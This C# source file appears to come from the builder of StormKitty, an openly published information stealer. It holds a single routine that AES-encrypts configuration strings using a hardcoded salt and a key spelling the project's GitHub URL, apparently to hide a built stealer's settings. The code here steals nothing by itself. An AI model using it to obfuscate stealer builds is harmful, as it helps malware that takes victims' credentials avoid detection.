/* 
    Author : LimerBoy
    Github : github.com/LimerBoy/StormKitty
*/

using System;
using System.IO;
using System.Text;
using System.Security.Cryptography;

namespace StormKittyBuilder
{
    internal sealed class crypt
    {
        // Salt
        private static readonly byte[] saltBytes = new byte[] { 255, 64, 191, 111, 23, 3, 113, 119, 231, 121, 252, 112, 79, 32, 114, 156 };
        private static readonly byte[] cryptKey = new byte[] { 104, 116, 116, 112, 115, 58, 47, 47, 103, 105, 116, 104, 117, 98, 46, 99, 111, 109, 47, 76, 105, 109, 101, 114, 66, 111, 121, 47, 83, 116, 111, 114, 109, 75, 105, 116, 116, 121 };

        // Encrypt string 
        public static string EncryptConfig(string value)
        {
            byte[] encryptedBytes = null;
            byte[] bytesToBeEncrypted = Encoding.UTF8.GetBytes(value); 

            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;
                    var key = new Rfc2898DeriveBytes(cryptKey, saltBytes, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);
                    AES.Mode = CipherMode.CBC;
                    using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                        cs.Close();
                    }
                    encryptedBytes = ms.ToArray();
                }
            }
            return "ENCRYPTED:" + Convert.ToBase64String(encryptedBytes);
        }

    }
}
